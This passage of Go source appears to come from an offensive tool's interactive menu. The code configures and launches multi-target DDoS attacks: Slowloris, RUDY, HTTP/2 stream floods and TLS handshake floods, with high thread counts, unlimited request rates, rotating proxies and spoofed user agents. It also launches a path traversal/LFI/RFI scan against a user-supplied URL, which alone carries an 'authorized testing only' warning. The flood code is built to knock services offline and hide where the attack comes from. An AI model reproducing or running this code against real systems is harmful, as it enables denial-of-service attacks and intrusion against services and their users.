			fmt.Println("\n===== TLS Configuration (for Slowloris) =====")
			fmt.Print("Enable TLS Renegotiation attacks? (y/n, default: n): ")
			renegotiationStr, _ := reader.ReadString('\n')
			renegotiationStr = strings.TrimSpace(strings.ToLower(renegotiationStr))
			tlsRenegotiation = renegotiationStr == "y" || renegotiationStr == "yes"
			if tlsRenegotiation {
				fmt.Println("✓ TLS Renegotiation enabled - Will force renegotiation on connections")
			}
		}

		// Number of threads
		fmt.Print("\nEnter number of threads (default: 500): ")
		threadsStr, _ := reader.ReadString('\n')
		threadsStr = strings.TrimSpace(threadsStr)
		maxThreads := 500
		if threadsStr != "" {
			if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
				maxThreads = t
			}
		}

		// Duration
		fmt.Print("Enter attack duration in seconds (default: 60): ")
		durationStr, _ := reader.ReadString('\n')
		durationStr = strings.TrimSpace(durationStr)
		duration := 60 * time.Second
		if durationStr != "" {
			if d, err := strconv.Atoi(durationStr); err == nil && d > 0 {
				duration = time.Duration(d) * time.Second
			}
		}

		// Rate limit
		fmt.Print("Enter rate limit (requests/sec, 0 = unlimited, default: 0): ")
		rateLimitStr, _ := reader.ReadString('\n')
		rateLimitStr = strings.TrimSpace(rateLimitStr)
		rateLimit := 0
		if rateLimitStr != "" {
			if r, err := strconv.Atoi(rateLimitStr); err == nil && r >= 0 {
				rateLimit = r
			}
		}

		// Custom User Agents
		fmt.Print("Use custom user agents from user-agent.txt? (y/n, default: y): ")
		useCustomAgentsStr, _ := reader.ReadString('\n')
		useCustomAgentsStr = strings.TrimSpace(strings.ToLower(useCustomAgentsStr))
		useCustomUserAgents := useCustomAgentsStr != "n" && useCustomAgentsStr != "no"

		if useCustomUserAgents {
			userAgentPath := filepath.Join(dataDir, "user-agent.txt")
			fmt.Printf("✓ Custom user agents enabled (%s)\n", userAgentPath)
		} else {
			fmt.Println("✓ Using built-in user agents")
		}

		// Connection reuse
		fmt.Print("Reuse connections? (y/n, default: y): ")
		reuseStr, _ := reader.ReadString('\n')
		reuseStr = strings.TrimSpace(strings.ToLower(reuseStr))
		reuseConnections := reuseStr != "n" && reuseStr != "no"

		// HTTP/2 Support (for flood mode)
		var useHTTP2 bool
		if attackMode == ddos.ModeFlood || attackMode == ddos.ModeMixed {
			fmt.Print("Enable HTTP/2 support? (y/n, default: n): ")
			http2Str, _ := reader.ReadString('\n')
			http2Str = strings.TrimSpace(strings.ToLower(http2Str))
			useHTTP2 = http2Str == "y" || http2Str == "yes"
			if useHTTP2 {
				fmt.Println("✓ HTTP/2 support enabled (requires HTTPS)")
			}
		}

		// Adaptive Rate Limiting
		var adaptiveRateLimit bool
		if rateLimit > 0 {
			fmt.Print("Use adaptive rate limiting? (y/n, default: n): ")
			adaptiveStr, _ := reader.ReadString('\n')
			adaptiveStr = strings.TrimSpace(strings.ToLower(adaptiveStr))
			adaptiveRateLimit = adaptiveStr == "y" || adaptiveStr == "yes"
			if adaptiveRateLimit {
				fmt.Println("✓ Adaptive rate limiting enabled - will adjust rate based on server response")
			}
		}

		// RUDY specific settings
		var rudyDelay time.Duration
		var rudyBodySize int
		if attackMode == ddos.ModeRUDY {
			fmt.Print("Enter RUDY delay between bytes in seconds (default: 10): ")
			rudyDelayStr, _ := reader.ReadString('\n')
			rudyDelayStr = strings.TrimSpace(rudyDelayStr)
			rudyDelay = 10 * time.Second
			if rudyDelayStr != "" {
				if d, err := strconv.Atoi(rudyDelayStr); err == nil && d > 0 {
					rudyDelay = time.Duration(d) * time.Second
				}
			}

			fmt.Print("Enter RUDY POST body size in bytes (default: 1048576 = 1MB): ")
			rudySizeStr, _ := reader.ReadString('\n')
			rudySizeStr = strings.TrimSpace(rudySizeStr)
			rudyBodySize = 1024 * 1024 // 1MB
			if rudySizeStr != "" {
				if s, err := strconv.Atoi(rudySizeStr); err == nil && s > 0 {
					rudyBodySize = s
				}
			}
			fmt.Printf("✓ RUDY configured: %d bytes, %s delay\n", rudyBodySize, rudyDelay)
		}

		// HTTP/2 Stream Flood settings
		var maxStreamsPerConn int
		if attackMode == ddos.ModeHTTP2StreamFlood {
			fmt.Print("Enter max streams per connection (default: 100): ")
			streamsStr, _ := reader.ReadString('\n')
			streamsStr = strings.TrimSpace(streamsStr)
			maxStreamsPerConn = 100
			if streamsStr != "" {
				if s, err := strconv.Atoi(streamsStr); err == nil && s > 0 {
					maxStreamsPerConn = s
				}
			}
			fmt.Printf("✓ Max streams per connection: %d\n", maxStreamsPerConn)
		}

		// Timeout
		fmt.Print("Enter request timeout in seconds (default: 5): ")
		timeoutStr, _ := reader.ReadString('\n')
		timeoutStr = strings.TrimSpace(timeoutStr)
		timeout := 5 * time.Second
		if timeoutStr != "" {
			if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
				timeout = time.Duration(t) * time.Second
			}
		}

		// Apply configuration to all selected configs
		for _, config := range selectedConfigs {
			config.AttackMode = attackMode
			config.MaxThreads = maxThreads
			config.Duration = duration
			config.RateLimit = rateLimit
			config.ReuseConnections = reuseConnections
			config.Timeout = timeout
			// Apply proxy settings
			config.UseProxy = useProxy
			config.ProxyList = proxyList
			config.RotateProxy = rotateProxy
			// Apply custom user agents settings
			config.UseCustomUserAgents = useCustomUserAgents
			if useCustomUserAgents {
				config.UserAgentFilePath = filepath.Join(dataDir, "user-agent.txt")
			}
			// Apply TLS settings
			// Note: UseTLSAttack and TLSHandshakeFlood are deprecated when using ModeTLSHandshakeFlood
			if attackMode != ddos.ModeTLSHandshakeFlood {
				config.UseTLSAttack = false
				config.TLSHandshakeFlood = false
			}
			config.ForceTLS = forceTLS
			config.TLSRenegotiation = tlsRenegotiation
			config.TLSMinVersion = tlsMinVersion
			config.TLSMaxVersion = tlsMaxVersion
			config.TLSCipherSuites = tlsCipherSuites
			// Apply HTTP/2 and advanced settings
			config.UseHTTP2 = useHTTP2
			config.AdaptiveRateLimit = adaptiveRateLimit
			config.RUDYDelay = rudyDelay
			config.RUDYBodySize = rudyBodySize
			config.MaxStreamsPerConn = maxStreamsPerConn
		}
	} // End of manual configuration mode

	// Summary before starting
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    ATTACK CONFIGURATION SUMMARY")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Printf("Targets:           %d\n", len(selectedConfigs))
	firstConfig := selectedConfigs[0]
	fmt.Printf("Attack Mode:       %s\n", firstConfig.AttackMode)
	fmt.Printf("Threads:           %d\n", firstConfig.MaxThreads)
	fmt.Printf("Duration:          %s\n", firstConfig.Duration)
	if firstConfig.RateLimit > 0 {
		fmt.Printf("Rate Limit:        %d req/s\n", firstConfig.RateLimit)
	} else {
		fmt.Printf("Rate Limit:        Unlimited\n")
	}
	fmt.Printf("Reuse Connections: %v\n", firstConfig.ReuseConnections)
	fmt.Printf("Request Timeout:   %s\n", firstConfig.Timeout)
	if firstConfig.UseCustomUserAgents {
		fmt.Printf("User Agents:       Custom (from user-agent.txt)\n")
	} else {
		fmt.Printf("User Agents:       Built-in\n")
	}
	if firstConfig.UseProxy {
		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
	} else {
		fmt.Printf("Proxy:             Disabled\n")
	}
	if firstConfig.AttackMode == ddos.ModeTLSHandshakeFlood {
		fmt.Printf("TLS Handshake Flood: Enabled\n")
		if firstConfig.ForceTLS {
			fmt.Printf("  - Force TLS:     Enabled\n")
		}
		if firstConfig.TLSMinVersion > 0 || firstConfig.TLSMaxVersion > 0 {
			fmt.Printf("  - TLS Versions:   Min=0x%04x, Max=0x%04x\n", firstConfig.TLSMinVersion, firstConfig.TLSMaxVersion)
		}
	} else if firstConfig.TLSRenegotiation {
		fmt.Printf("TLS Renegotiation:  Enabled (for Slowloris)\n")
	}
	if firstConfig.UseHTTP2 {
		fmt.Printf("HTTP/2 Support:    Enabled\n")
	}
	if firstConfig.AdaptiveRateLimit {
		fmt.Printf("Adaptive Rate:     Enabled\n")
	}
	if firstConfig.AttackMode == ddos.ModeRUDY {
		fmt.Printf("RUDY Config:       %d bytes, %s delay\n", firstConfig.RUDYBodySize, firstConfig.RUDYDelay)
	}
	if firstConfig.AttackMode == ddos.ModeHTTP2StreamFlood {
		fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
	}
	fmt.Println(strings.Repeat("=", 70))

	// Ask if user wants to save configuration as template before attack (only for manual mode)
	if configChoice != "1" {
		fmt.Print("\nSave this configuration as a template? (y/n, default: n): ")
		saveConfigStr, _ := reader.ReadString('\n')
		saveConfigStr = strings.TrimSpace(strings.ToLower(saveConfigStr))

		if saveConfigStr == "y" || saveConfigStr == "yes" {
			fmt.Print("Enter template name (without .txt extension): ")
			templateName, _ := reader.ReadString('\n')
			templateName = strings.TrimSpace(templateName)
			if templateName != "" {
				if !strings.HasSuffix(templateName, ".txt") {
					templateName += ".txt"
				}
				savedPath, err := ddos.SaveConfigAsTemplate(firstConfig, templateName)
				if err != nil {
					fmt.Printf("Error saving template: %v\n", err)
				} else {
					fmt.Printf("✓ Template saved: %s\n", savedPath)
				}
			}
		}
	}

	// Final confirmation
	fmt.Print("\nStart DDoS attack? (y/n): ")
	startConfirm, _ := reader.ReadString('\n')
	startConfirm = strings.TrimSpace(strings.ToLower(startConfirm))
	if startConfirm != "y" {
		fmt.Println("Attack cancelled.")
		return
	}

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start attacks
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    DDoS ATTACK IN PROGRESS")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println("Press Ctrl+C to stop the attack...")
	fmt.Println()

	var attacks []*ddos.DDoSAttack
	var wg sync.WaitGroup

	// Progress display
	progressMutex := sync.Mutex{}
	lastStats := make(map[int]ddos.AttackStats)

	for i, config := range selectedConfigs {
		// Create progress callback
		idx := i
		config.OnProgress = func(stats ddos.AttackStats) {
			progressMutex.Lock()
			lastStats[idx] = stats
			progressMutex.Unlock()
		}

		attack := ddos.New(*config)
		attacks = append(attacks, attack)

		wg.Add(1)
		go func(a *ddos.DDoSAttack) {
			defer wg.Done()
			if err := a.Start(ctx); err != nil {
				fmt.Printf("Error starting attack: %v\n", err)
				return
			}
			a.Wait()
		}(attack)
	}

	// Display progress in real-time
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				progressMutex.Lock()
				// Clear previous output and display stats
				fmt.Print("\r\033[K") // Clear line

				var totalSent, totalSuccess, totalFailed int64
				var totalRPS float64
				var totalActiveProxies, totalDisabledProxies int

				for _, stats := range lastStats {
					totalSent += stats.RequestsSent
					totalSuccess += stats.RequestsSuccess
					totalFailed += stats.RequestsFailed
					totalRPS += stats.RequestsPerSec
					totalActiveProxies += stats.ActiveProxies
					totalDisabledProxies += stats.DisabledProxies
				}

				if len(lastStats) > 0 {
					elapsed := time.Duration(0)
					for _, stats := range lastStats {
						if stats.ElapsedTime > elapsed {
							elapsed = stats.ElapsedTime
						}
					}
					remaining := firstConfig.Duration - elapsed
					if remaining < 0 {
						remaining = 0
					}

					proxyInfo := ""
					if firstConfig.UseProxy {
						proxyInfo = fmt.Sprintf(" | Proxies (active/disabled): %d/%d", totalActiveProxies, totalDisabledProxies)
					}

					fmt.Printf("⏱  Elapsed: %s | Remaining: %s | Sent: %d | Success: %d | Failed: %d | RPS: %.0f%s",
						ddos.FormatDuration(elapsed),
						ddos.FormatDuration(remaining),
						totalSent,
						totalSuccess,
						totalFailed,
						totalRPS,
						proxyInfo)
				}
				progressMutex.Unlock()
			}
		}
	}()

	// Wait for all attacks to complete
	wg.Wait()

	// Final stats
	fmt.Println("\n\n" + strings.Repeat("=", 70))
	fmt.Println("                    ATTACK COMPLETE")
	fmt.Println(strings.Repeat("=", 70))

	var grandTotal ddos.AttackStats
	for i, attack := range attacks {
		stats := attack.GetStats()
		grandTotal.RequestsSent += stats.RequestsSent
		grandTotal.RequestsSuccess += stats.RequestsSuccess
		grandTotal.RequestsFailed += stats.RequestsFailed
		grandTotal.BytesSent += stats.BytesSent
		grandTotal.BytesReceived += stats.BytesReceived

		fmt.Printf("\n[Target %d] %s %s\n", i+1, selectedConfigs[i].Method, selectedConfigs[i].TargetURL)
		fmt.Printf("  Requests Sent:     %d\n", stats.RequestsSent)
		fmt.Printf("  Successful:        %d\n", stats.RequestsSuccess)
		fmt.Printf("  Failed:            %d\n", stats.RequestsFailed)
		fmt.Printf("  Data Sent:         %s\n", ddos.FormatBytes(stats.BytesSent))
		fmt.Printf("  Data Received:     %s\n", ddos.FormatBytes(stats.BytesReceived))
		fmt.Printf("  Avg Response Time: %s\n", stats.AvgResponseTime)
		fmt.Printf("  Requests/sec:      %.2f\n", stats.RequestsPerSec)
		if selectedConfigs[i].UseProxy {
			fmt.Printf("  Proxies Active:    %d\n", stats.ActiveProxies)
			fmt.Printf("  Proxies Disabled:  %d\n", stats.DisabledProxies)
		}
	}

	if len(attacks) > 1 {
		fmt.Println("\n" + strings.Repeat("-", 70))
		fmt.Println("GRAND TOTAL:")
		fmt.Printf("  Total Requests:    %d\n", grandTotal.RequestsSent)
		fmt.Printf("  Total Successful:  %d\n", grandTotal.RequestsSuccess)
		fmt.Printf("  Total Failed:      %d\n", grandTotal.RequestsFailed)
		fmt.Printf("  Total Data Sent:   %s\n", ddos.FormatBytes(grandTotal.BytesSent))
		fmt.Printf("  Total Data Recv:   %s\n", ddos.FormatBytes(grandTotal.BytesReceived))
	}

	fmt.Println(strings.Repeat("=", 70))
	fmt.Println()
}

// editDDoSConfig allows user to edit specific DDoS configuration parameters
func (m *Menu) editDDoSConfig(config *ddos.DDoSConfig, reader *bufio.Reader) *ddos.DDoSConfig {
	fmt.Println("\n===== Edit Configuration =====")
	fmt.Println("Which parameter would you like to edit?")
	fmt.Println("  [1] Target URL")
	fmt.Println("  [2] HTTP Method")
	fmt.Println("  [3] Number of Threads")
	fmt.Println("  [4] Attack Duration (seconds)")
	fmt.Println("  [5] Rate Limit (requests/sec)")
	fmt.Println("  [6] Timeout (seconds)")
	fmt.Println("  [7] Done editing")
	fmt.Print("Enter choice (1-7): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		fmt.Print("Enter new target URL: ")
		url, _ := reader.ReadString('\n')
		config.TargetURL = strings.TrimSpace(url)
		fmt.Println("✓ Target URL updated")
		return m.editDDoSConfig(config, reader) // Allow editing more parameters

	case "2":
		fmt.Print("Enter HTTP method (GET, POST, PUT, etc.): ")
		method, _ := reader.ReadString('\n')
		config.Method = strings.ToUpper(strings.TrimSpace(method))
		fmt.Println("✓ HTTP method updated")
		return m.editDDoSConfig(config, reader)

	case "3":
		fmt.Print("Enter number of threads: ")
		threadsStr, _ := reader.ReadString('\n')
		if t, err := strconv.Atoi(strings.TrimSpace(threadsStr)); err == nil && t > 0 {
			config.MaxThreads = t
			fmt.Println("✓ Threads updated")
		}
		return m.editDDoSConfig(config, reader)

	case "4":
		fmt.Print("Enter attack duration in seconds: ")
		durationStr, _ := reader.ReadString('\n')
		if d, err := strconv.Atoi(strings.TrimSpace(durationStr)); err == nil && d > 0 {
			config.Duration = time.Duration(d) * time.Second
			fmt.Println("✓ Duration updated")
		}
		return m.editDDoSConfig(config, reader)

	case "5":
		fmt.Print("Enter rate limit (requests/sec, 0 = unlimited): ")
		rateStr, _ := reader.ReadString('\n')
		if r, err := strconv.Atoi(strings.TrimSpace(rateStr)); err == nil && r >= 0 {
			config.RateLimit = r
			fmt.Println("✓ Rate limit updated")
		}
		return m.editDDoSConfig(config, reader)

	case "6":
		fmt.Print("Enter timeout in seconds: ")
		timeoutStr, _ := reader.ReadString('\n')
		if t, err := strconv.Atoi(strings.TrimSpace(timeoutStr)); err == nil && t > 0 {
			config.Timeout = time.Duration(t) * time.Second
			fmt.Println("✓ Timeout updated")
		}
		return m.editDDoSConfig(config, reader)

	case "7":
		fmt.Println("✓ Done editing")
		return config

	default:
		fmt.Println("Invalid choice")
		return m.editDDoSConfig(config, reader)
	}
}

// pathTraversalAttack performs path traversal/LFI/RFI testing
func (m *Menu) pathTraversalAttack() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("\n===== Scan Path Traversal (LFI/RFI) =====")
	fmt.Println("\n[WARNING] This tool is for authorized security testing and educational purposes only.")
	fmt.Println("Unauthorized access to computer systems is illegal.")

	// Get target URL
	fmt.Print("\nEnter target URL (e.g., http://example.com/download.php): ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	if targetURL == "" {
		fmt.Println("Target URL required")
		return
	}

	// Normalize URL
	targetURL = pathtraversal.NormalizeURL(targetURL)

	// Get number of threads
	fmt.Print("Number of threads (default: 10): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	threads := 10
	if threadsStr != "" {
		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
			threads = t
		}
	}

	// Get timeout
	fmt.Print("Timeout in seconds (default: 10): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeoutStr = strings.TrimSpace(timeoutStr)
	timeout := 10 * time.Second
	if timeoutStr != "" {
		if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
			timeout = time.Duration(t) * time.Second
		}
	}

	// Auto-discover parameters
	fmt.Println("\n[*] Auto-discovering parameters from URL...")
	params := pathtraversal.DiscoverParameters(targetURL)

	if len(params) == 0 {
		fmt.Println("[!] No parameters found in URL, using common parameter names")
		params = pathtraversal.CommonParameters()
	}

	fmt.Printf("[✓] Found %d parameters to test: %v\n\n", len(params), params)

	// Create config with progress callback
	lastUpdate := time.Now()
	progressMutex := sync.Mutex{}

	config := pathtraversal.PathTraversalConfig{
		TargetURL:      targetURL,
		MaxThreads:     threads,
		Timeout:        timeout,
		TestParameters: params,
		OnProgress: func(stats pathtraversal.Stats) {
			progressMutex.Lock()
			defer progressMutex.Unlock()

			// Display progress every 100ms minimum
			if time.Since(lastUpdate) > 100*time.Millisecond {
				percentage := 0
				if stats.TotalParameters > 0 {
					percentage = int((float64(stats.ParametersScanned) / float64(stats.TotalParameters)) * 100)
				}

				fmt.Printf("\r[*] Progress: %d%% | Tested: %-7d | Found: %-4d | Time: %v",
					percentage, stats.PayloadsTested, stats.VulnerabilitiesFound, stats.ElapsedTime)
				os.Stdout.Sync() // Force flush
				lastUpdate = time.Now()
			}
		},
	}

	// Create attack instance
	attack := pathtraversal.New(config)

	// Run the attack
	fmt.Println("\n[*] Starting path traversal scan...")
	fmt.Println("[*] Testing payloads for: Unix paths, Windows paths, web configs, and bypass techniques")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	err := attack.Start(ctx)
	if err != nil {
		fmt.Printf("\n[!] Error: %v\n", err)
		return
	}

	// Get results
	results := attack.GetResults()
	stats := attack.GetStats()
	scanDuration := stats.ElapsedTime

	// Display formatted summary
	fmt.Println(pathtraversal.FormatSummary(stats, results, scanDuration))

	if len(results) > 0 {
		// Display formatted results
		fmt.Println(pathtraversal.FormatResults(results))

		// Save to file
		// Ensure data directory exists
		if err := os.MkdirAll(dataDir, 0755); err != nil {
			fmt.Printf("Warning: Failed to create data directory: %v\n", err)
		}
		outputFile := filepath.Join(dataDir, "results.txt")
		fmt.Printf("\nSaving results to %s...\n", outputFile)

		// Append to results file
		f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			fmt.Fprintf(f, "\n===== PATH TRAVERSAL RESULTS =====\n")
			fmt.Fprintf(f, "Target: %s\n", targetURL)
			fmt.Fprintf(f, "Scan Time: %s\n", time.Now().Format(time.RFC3339))
			fmt.Fprintf(f, "Total Vulnerabilities: %d\n", len(results))
			fmt.Fprintf(f, "%s\n", pathtraversal.FormatResults(results))
			f.Close()
			fmt.Printf("[✓] Results saved to %s\n", outputFile)
		}
	} else {
		fmt.Println("[*] No vulnerabilities detected")
	}
}
